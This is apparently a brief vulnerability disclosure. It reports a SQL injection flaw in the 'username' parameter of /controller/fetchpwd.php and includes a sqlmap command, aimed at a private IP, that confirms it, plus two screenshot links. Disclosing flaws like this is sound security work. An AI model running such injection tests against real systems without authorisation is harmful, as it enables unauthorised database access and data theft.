| In /controller/fetchpwd.php It will receive a parameter called "username" to search for existed users. But in fact,this parameter just become a part of the SQL request without any process,so it will be possible to have a SQL injection. We can use SQLMAP to test this vulnerability:  sqlmap -u "<http://192.168.31.91/controller/fetchpwd.php>" --data "username=1" --dbms mysql -p username  [E535%I1OKP)DWL}`GBDR29B](https://user-images.githubusercontent.com/74465835/118992758-7fd8cb00-b9b7-11eb-8995-ec67ef1bc5dd.png)  [Z($YDT678FOJ0 3N2~ L_IK](https://user-images.githubusercontent.com/74465835/118992625-646dc000-b9b7-11eb-8d9c-b3adff9266f5.png) |
